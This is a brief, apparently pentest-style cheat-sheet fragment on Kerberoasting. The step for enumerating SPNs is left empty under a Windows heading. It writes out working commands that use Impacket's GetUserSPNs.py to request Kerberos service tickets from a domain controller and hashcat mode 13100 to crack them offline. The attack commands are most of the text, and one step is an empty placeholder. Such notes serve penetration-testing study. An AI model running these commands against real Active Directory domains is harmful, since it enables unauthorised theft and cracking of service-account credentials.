1. Enumerate SPNs

# Windows (example)

2. Request TGS & crack

# PLACEHOLDER
GetUserSPNs.py domain/user:pass -dc-ip <dc-ip> -request -outputfile tgs.hashes
hashcat -m 13100 tgs.hashes /path/wordlist.txt
